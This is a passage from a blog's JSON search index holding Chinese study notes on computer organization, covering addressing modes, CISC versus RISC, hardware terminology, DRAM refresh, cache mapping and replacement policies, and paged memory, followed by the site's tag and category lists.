EA=R 0 寄存器间接寻址 EA=(R) 1 隐含寻址 程序指定 0 立即寻址 A 为操作数 0 基址寻址 EA=(BR)+A 1 变址寻址 EX=(IX)+A 1 相对寻址 EA=(PC)+A 1 堆栈寻址 入栈\\出栈时 EA 的确定方式不同 硬堆栈不访存,软堆栈访存 1 次 CISC 和 RISCCISC 设计思路一条指令完成一个复杂的基本功能 80-20 规律典型程序中 80%的语句使用处理机中 05 的指令 特点一条指令有一个专门的电路完成, 有的复杂指令用纯硬件难以实现采用 存储程序的设计思想, 由一个比较通用的电路配合存储部件完成一条指令 RISC 设计思路一条指令完成一个基本动作多条指令组合完成一个复杂的基本功能一条指令对应一个电路, 电路设计相对简单,功耗更低 对比 名称 CISC RISC 指令系统 复杂, 庞大 简单, 精简 指令数目 一般大于 200 条 一般小于 100 条 指令字长 不固定 定长 可访存指令 不加限制 只有 Load\\Store 指令 各种指令的执行时间 相差较大 绝大多数在一个周期内完成 各种指令使用频率 相差很大 都比较常用 通用寄存器数量 较少 多 目标代码 难以用优化编译器生成高效的目标代码 采用优化的编译程序,生成代码较为高效 控制方式 绝大多数可为微程序控制器 绝大多数为组合逻辑控制 指令流水线 可以通过一定方式实现 必须实现","link":"/2021/07/05/COP-4/"},{"title":"计算机组成原理——专业名词","text":"计算机组成原理中一些常见名词的总结 数据通路带宽,吞吐量,响应时间 数据通路带宽: 数据总线一次冰雪传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 一般使用吞吐量来评价计算机系统的综合性能 地址空间,存储字长,数据字长 地址空间: 地址由多少位就有多少个线性空间 存储字长: 存放在一个存储单元中的二进制代码位数, 等于MDR的位数 数据字长: 数据总线一次能并行传送的位数 机器字长: 计算机位数, 表示计算机一次能处理的二进制位数 机器字长决定计算机精度 机器字长=CPU内部用于整数运算的运算器和通用寄存器的位数 指令字长=存储字长(MDR)=机器字长 存储器相关名词查看详情 MDR: 地址寄存器, $长度=log_2总容量$ MAR: 数据寄存器 存储单元: 每个存储单元存放一串二进制码 存储字: 存储单元中二进制代码的组合 存储字长: 存储单元中二进制代码的位数 存储元: 存储一个二进制位(1bit) CPU相关名词查看详情 机器字长: CPU进行一次整数运算所能处理的二进制数据的位数(通常与ALU之间相关) 指令字长: 一条指令的总长度(可能会变) 半字长指令, 单字长指令, 双字长指令指的是指令长度是机器字长的多少倍 时钟周期: 单位 微妙 纳秒 $CPU主频(时间频率)=\\frac{1}{CPU的时钟周期}$,单位赫兹(Hz) CPI: 指令执行所需的时钟周期数量 IPS: $每秒执行多少条指令=\\frac{主频}{平均CPI}$ FLOPS: 每秒钟可以执行多少次浮点运算 $平均指令周期=\\frac{1}{IPS}(单位由IPS决定)$ 一般使用IPS标志系统性能 最小时间单位是时钟周期 常说的运算速度就是指CPI 这里常考计算,因此要注意$程序的运行时间=\\frac{指令数量}{IPS}$ ,有时题目会挖坑改变CPI,因此要注意转换问题$1G=10^3M=10^6K=10^9$, 用来表示$Hz, IPS, FLOPS$, 如$MHz, MIPS$$1MHz=1\\mu s, 1Hz=1ms$两个芯片片内逻辑相同=两个芯片的CPI相同","link":"/2021/06/29/COP-WORDS/"},{"title":"计算机组成原理——存储系统","text":"计算机组成原理——存储系统笔记 基本概念 辅存的数据要读入主存才能被 CPU 访问 cache: 放置频繁被访问的数据,加快 CPU 读/写数据的速度(缓解 CPU 与主存之间的速度矛盾) 主存-辅存层由硬件+操作系统完成解决了主存容量不够的问题 cache-主存层由硬件自动完成解决主存与 CPU 速度不匹配的问题 性能指标 $存储容量 = 存储字数 \\times 字长$, MDR 位数反应存储字长 $单位成本(每位价格)=总成本 \\div 总容量$ $\\spadesuit 存储速度 (数据传输率) = 数据的宽度 \\div 存储周期$ - $存取周期T_m=存取时间T_a+恢复时间$ - 存取时间是从启动一次存储器操作到完成该操作所需时间,分为读出时间和写入时间 - 存取周期指存储器进行一次完整的读写操作所需的全部时间,即连续两次独立地访问存储器操作之间所需最小的时间间隔 - 主存带宽($B_m$)表示从主存进出信息的最大数量单位通常为 字/秒, 字节/秒, 位/秒(b/s) RAM 芯片 会考求芯片的引脚数一般的输入有地址线, 数据线, 读写线, 片选线等(供电引脚, 接地引脚), 根据存储容量,判断出地址线和数据线需要有多少位($地址线数量=log_2(\\frac{总热量}{每个单元的大小}), 数据线=每个单元的大小$) MDR数据总线, 宽度=存储字长 MAR地址总线 存储元存储一个二进制位 存储单元多个存储元组成的部件(个数一般为存储字长的 bit 位数) 存储体由多个存储单元构成 译码器将输入地址转化为输出线输出的高电平信号,每一个输出线对应一个存储单元 控制电路控制译码器和 MDR 片选线, 芯片选择信号(低电平时启用)($\\overline{CS} 或 \\overline{CE} $) 读($\\overline{WE}$)\\写($\\overline{OE}$)控制线当只有一根读\\写控制线时,$\\overline{WE}$ 表示低电平写, $WE$ 表示高电平读当有两根读\\写线时,$\\overline{WE}$ 表示低电平允许写, $\\overline{OE}$ 表示低电平允许读 常见的描述方法$ 8\\times 8$, 第一个8表示有多少个存储单元,第二个表示存储字长 如: $8K \\times 8$, 表示$2^{13} \\times 8 bit$ DRAM 与 SRAM 常考考点 两者的比较 2. DRAM 的刷新 3. DRAM 的地址线复用技术 DRAM 与 SRAM 的区别 类型 SRAM(静态 RAM) DRAM(动态 RAM) 作用 常用于 Cache 常用于主存 存储方式 双稳态触发器存储信息 栅极电容存储信息 破坏性读出 否 是 读出后需要重写 否 是 运行速度 快 慢 集成度 低 高 发热量 高 低 存储成本 高 低 特性 断电后信息消失 断线后信息消失 需要”刷新” 不需要 需要 送行列地址 同时 分两次(地址线复用技术) DRAM 刷新“刷新”: 因为电容里的电荷只能存在2ms, 因此2ms之内,必须给电容充电 刷新周期: 2ms 每次刷新一行存储单元(存储器的行列地址的一行) 行列地址:存储单元像数组一样排列,分别使用行地址译码器和列地址译码器,将地址的前 $\\frac{n}{2}$ 位看作行地址,后 $\\frac{n}{2}$ 位看作列地址 硬件刷新, 读出一行信息后重新写入, 占用 1 个读/写周期 刷新方法(常考) 注: 刷新周期一般为 2ms, 若题目给出,则以题目为主例: 设 DRAM 排列结构位$128\\times128$, 读写周期为0.5us, 2ms共 $\\frac{2ms}{0.5us}=4000个周期$ - 方法一: 分散刷新 每次读写完刷新一行(导致存取周期翻倍,周期变为`1us`) 前0.5us用来正常读写, 后`0.5us`用来刷新某行, `2ms`内,刷新`2000`次,对于 $128\\times128$ 的结构来说,足够 - 方法二: 集中刷新 `2ms`内集中安排刷新方式,系统的存取周期还是`0.5us` 在这段时间内无法访问存储器,称为访存&quot;死区&quot; 对于 $128\\times128$ 的结构来说, 在最后的`128`(行数)个周期(`64us`)内集中刷新 - 方法三: 异步刷新 `2us`内需要产生`128`次刷新请求 即 每过 $\\frac{2ms}{128} = 15.6us$, 刷新一次, 每`15.6us`内有`0.5us`的&quot;死时间&quot; DRAM 的地址线复用技术 注意: 在求引脚数时, 要注意DRAM采用了地址线复用技术,即地址线数量减半 将行地址与列地址分两次传输先将行地址存放到行地址缓冲器,再将列地址传送到列地址缓冲器,之后在送给行地址与列地址译码器 ROM 芯片 MROM 掩模式制度存储器在芯片生成过程中直接写入信息, 之后不可重写, 只能读出可靠性高, 灵活性差, 生产周期长, 只适合定制 PROM 可编程只读存储器用专门的 PROM 写入器写入信息, 写一次后不可更改 EPROM 可擦除可编程只读存储器允许用户写入信息, 可用某种方法擦除信息, 可多次重写 UVEPROM使用紫外线照射 8~20 分钟可擦除所有信息 EEPROM($E^2PROM$)使用电擦除特定的字 Flash Memory 闪速存储器断电后也能保存信息, 可进行多次快速擦除重写需要先擦除在写入, 因此写速度要慢于读速度 如 U 盘, SD 卡等每个存储元使用单个 MOS 管, 位密度比 RAM 高 SSD 固态硬盘由 控制单元 + 存储单元(Flash 芯片) 构成, 可进行多次快速擦除重写速度快 功耗低, 价格高 主存一般由 RAM+ROM 组成,且二者统一编址 存储芯片与 CPU 的连接 注意片选线的符号是表示高电平有效还是低电平有效 位扩展 容量不变, 字长增加 CPU 相同的地址线连接多个芯片的地址线, 每个芯片的数据输出线连接到 CPU 不同的数据输入口 字扩展 容量增加, 字长不变 CPU 相同的地址线连接多个芯片的地址线, 每个芯片的数据输出线连接到 CPU 相同的数据输入口其余地址线连接芯片的片选线 线选法剩余的地址线分别连接芯片的片选线即高位地址线控制选择的芯片, 若用于选择芯片的地址线输出多个 1, 数据总线会产生冲突 译码片选法(常考)将多余地址线连接到译码器,译码器的输出连接到芯片的片选线, 即高地址为控制选择哪个芯片 译码器的使用, 选择的是哪些芯片地址空间属于哪块芯片 双端口 RAM用于优化多核 CPU, 多个 CPU 同时访问 RAM需要两组完全独立的数据线, 地址线和控制线 注意对于同一地址不能同时写,或同时写读 多模块存储器特点: 每个模块都有相同的容量和存取速度, 各模块拥有独立的读写控制电路, 地址寄存器和数据寄存器, 既能并行工作, 也能交叉工作 单体多字存储器 每次并行读出 m 个连续的字 总线宽度也为 m 个字 一次并行读出 m 个字, 不能单独读取其中某个字 指令和数据在主存必须是连续存放 多体并行存储器 设每个存储体的存取周期为 T, 存取时间为 r, 恢复时间为 3r, T=4r 高位交叉编制 用高比特位来表示要访问那个内存条,这些比特位被成为体号 理论上多个存储体可以被并行访问,但由于通常会连续访问, 因此实际上效果相当于单纯的扩容 在一个内存条内地址编号是连续的 如果连续访问连续的地址(在同一个内存条内的地址),需要等待上一个存储体恢复周期结束才能读取下一个, 因此需要花费 nT 的时间(即一个 T 内只能读取一个存储体) 低位交叉编制 用低比特位来表示要访问那个内存条,这些比特位被成为体号 在同一内存条内地址编号不连续01H 地址对应第一根内存条的第一个存储体,而 02H 对应第二根内存条的第一个存储体, 以此类推 如果连续访问连续的地址(在同一个内存条内的地址), 就不需要等待上一个存储体的恢复, 可以直接读取下一个存储体, 因此至需花费 T+(n-1)r(注意,这个算式是以 4 根内存条来计算 即在一个 T 内,可以读取地址连续的存储体为 4 个, 读取完第四个存储体后,刚好第一个内存条完成恢复时间,可以读取下一个,因此在一个周期内可以读取 4 个数据,读取完最后一个存储体后,在等待恢复时间 3r,即读取完成) 当存储模块数 $m \\geq \\frac{T}{r}$ 时, 可以使流水线不间断 每个存储周期内可读写地址连续的 m 个字 微观上, m 个模块被串行访问 宏观上, 每个存储周期内所有模块被并行访问 要会计算读取多少个字需要多长的时间注意: 时间包括等待模块写回的时间在题目中,r 可以被表示为存取时间/总线传输周期 CacheCache 使用 SRAM 实现 工作原理 局部性原理 空间局部性: 最近的未来要使用的信息(指令和数据)与现在使用的信息在存储空间上是邻近的 时间局部性: 最近的未来使用的信息是现在正在使用的信息 将 CPU 目前访问的地址周围部分的数据放到 Cache 中 性能指标(常考)$t_c为访问一次Cache所需的时间$$t_m为访问一次主存所需的时间$ 命中率 HCPU 欲访问的信息已在 Cache 中的比率 缺失率(未命中)M = 1 - H 平均访问时间 先访问 Cache,若 Cache 未命中在访问主存$t=Ht_c+(1-H)(t_c+t_m)$ 同时访问 Cahce 和主存,若 Cache 命中则立即停止访问主存$t=Ht_c+(1-H)t_m$ 每次访问的主存块立即调入 Cache 中 Cache 与主存的映射方式 在 Cache 块中,通过标记记录存放的主存块号,通过有效位来表示标记是否有效 Cache 块的大小与主存块的大小相等 若主存大小为$256M=2^{28}, 块大小(行长)=64B=2^{6}$ 则主存的地址共 28 位 主存块号 块内地址 22 位 6 位 全相联映射(随意放)主存块可以放在 Cache 的任意位置 缺点查找标记慢 优点能充分利用Cache存储空间 CPU 访问方式 CPU 要访问的主存地址的块号与 Cache 中的标记进行对比 若标记匹配,且有效位=1, 则 Cache 命中 若未命中或有效位=0, 则正常访问主存 直接映射每个主存块只能放到一个特定的位置Cahce 块号=主存块号 % Cahce 总数 缺点不能充分利用 Cache, 命中率低 优点可以优化标记位,省略块号末尾的$log_2Cache块数$位, 速度最快 CPU 访问方式 取出块号的后$log_2Cache块数$位, 直接访问 Cache 中对应的块 若主存块号的其余位(除去$log_2Cache块数$位)与 Cache 标记位相同,且有效位为 1,则 Cache 命中 若未命中或有效位=0, 则正常访问主存 组相联映射Cahce 块分为若干组, 每个主存块可放到特定分组的任意一个位置 2 路组相联映射: 2 个 Cache 块为一组n 路组相联映射: n 个 Cache 块为一组 组号=主存块号 % 分组数 另外两种方法的折中, 综合效果比较好 CPU 访问方式 取出块号的后$log_2\\frac{Cache块数}{每个分组块数}$位, 找出对应的 Cache 组 在对应的Cahce分组中, 主存块号的其余位(除去$log_2\\frac{Cache块数}{每个分组块数}$位)与标志位对比,若相同且有效位=1,则Cache命中 若未命中或有效位=0, 则正常访问主存 Cache替换算法 全相联映射Cache完全满了才需要替换 直接映射如果对应位置非空, 则直接替换 组相联映射只有分组内满了才需要在分组内选择替换 随机算法(RAND)若Cache已满,则随机选择一块替换 优点实现简单 缺点没考虑局部性原理, 命中率低, 实际效果很不稳定先进先出算法(FIFO)若Cache已满, 替换最先被调入Cache的块 优点实现简单 缺点没考虑局部性原理, 命中率低, 最先进入Cache的可能是最频繁访问的 抖动现象刚被替换的块很快又被访问近期最少使用(LRU)(最常考)每一个Cache设置一个计数器(用来记录该Cache块有多长时间没被访问), 每次替换选择计数器最大的块(淘汰最久没访问的块) 计数器规则 命中时, 所命中的Cache的计数器清零, 比该计数器值更小的计数器值加1 未命中且还有空闲时, 新装入的Cache块的计数器置0, 其余非空闲计算机加1 未命中且无空闲时, 计数器最大的Cache块被替换,计数器置0,其余加1 优点实际运行效果优秀, Cache命中率高 缺点若被频繁访问的主存块数量&gt;Cache行的数量, 则有可能发生抖动近期不经常使用(LFU)每一个Cache设置一个计数器(用来记录每个块被访问过多少次), 每次替换计数器最小的块(淘汰最少使用的块) 计数器规则 新调入的块计数器=0 块被访问一次,对应的计数器+1 替换时, 替换计数器最小的块, 计数器置0 若有多个计数器最小的块 可以按行号递增(淘汰行号小的)或FIFO策略(淘汰先进入Cache的)淘汰 缺点曾经经常被访问的主存块,未来不一定会用到,因此有可能会在Cache中停留很长时间因为要存储命中次数,因此计数器的可能需要较大的存储空间Cache可能不高 Cache写策略 因为只有写操作才会导致Cache中的数据与主存中的数据不一致 当CPU的写操作在Cache中时,称为写命中; 不在Cache中,则称为写不命中写命中对应的算法有写回法和全写法 写回法当CPU对Cache写命中时, 只修改Cache的内容, 当此块被换出时, 才写回主存 脏位表示Cache中的数据是否被修改, 若修改则在该块被替换时写回主存 优点减少了访存的次数 缺点存在数据不一致的隐患全写法当CPU对Cache写命中时, 必须把数据同时写入Cache和主存中(一般使用写缓冲, 写缓冲通过SRAM实现) 优缺点使用写缓冲, CPU写的速度很快若写操作不频繁, 则效果好若写操作频繁,则可能会因为写缓冲饱和而发生阻塞 写分配法当CPU对Cache写不命中时, 把主存中的块调入Cache, 在Cache中修改.(通常搭配写回法) 非写分配法当CPU写不命中时,只写入主存,不调入Cache(常搭配全写法使用)在使用这种方法时, 只有读未命中才调入Cache中 各级Cache之间常使用全写法+非写分配法Cache与主存之间常使用写回法+写分配法 页式存储器 页式存储系统: 一个进程在逻辑上被分为若干个大小相等的页面,每个页面大小与块的大小相同. 每个页面可以离散的放入不同的主存块中 每个页面与主存块的大小相同 逻辑地址(虚地址): 程序员看到的地址由逻辑页号与页内地址组成, 页表一般存储在主存中 物理地址(是地址): 时间在主存的地址由主存块号和块内地址组成 页表中存储逻辑页号对应的主存块号 在使用逻辑地址时 计算机会将逻辑地址拆分成逻辑页号和页内地址 将逻辑页号取出, 然后在CPU中取出页表基地址 然后在页表中找到对应的主存块号; 主存块号拼接上页内地址后成为物理地址 块表 相当于地址变化过程中添加了一个Cache, 加快页号转换为主存块号的时间区别是快表存储的是页表项中的副本, 而Cache存储的是主存块的副本 在逻辑地址变化的基础上, 插入一个快表,先在快表中查找有无对应的主存块号快表使用SRAM, 是相联存储器, 可以按内容寻访","link":"/2021/06/27/COP-3/"}],"tags":[{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"PE","slug":"PE","link":"/tags/PE/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"LKM","slug":"LKM","link":"/tags/LKM/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Kivy","slug":"Kivy","link":"/tags/Kivy/"},{"name":"App","slug":"App","link":"/tags/App/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"ClientIP","slug":"ClientIP","link":"/tags/ClientIP/"},{"name":"InformationLeakage","slug":"InformationLeakage","link":"/tags/InformationLeakage/"},{"name":"DataStructure","slug":"DataStructure","link":"/tags/DataStructure/"},{"name":"Computer Organization Principles","slug":"Computer-Organization-Principles","link":"/tags/Computer-Organization-Principles/"}],"categories":[{"name":"Firewall","slug":"Firewall","link":"/categories/Firewall/"},{"name":"Application","slug":"Application","link":"/categories/Application/"},{"name":"Note","slug":"Note","link":"/categories/Note/"},{"name":"PE","slug":"Note/PE","link":"/categories/Note/PE/"},{"name":"WEB","slug":"Note/WEB","link":"/categories/Note/WEB/"},{"name":"Kivy","slug":"Application/Kivy","link":"/categories/Application/Kivy/"},{"name":"SQL","slug":"Note/SQL","link":"/categories/Note/SQL/"},{"name":"DataStructure","slug":"Note/DataStructure","link":"/categories/Note/DataStructure/"},{"name":"Computer Organization Principles","slug":"Note/Computer-Organization-Principles","link":"/categories/Note/Computer-Organization-Principles/"}]}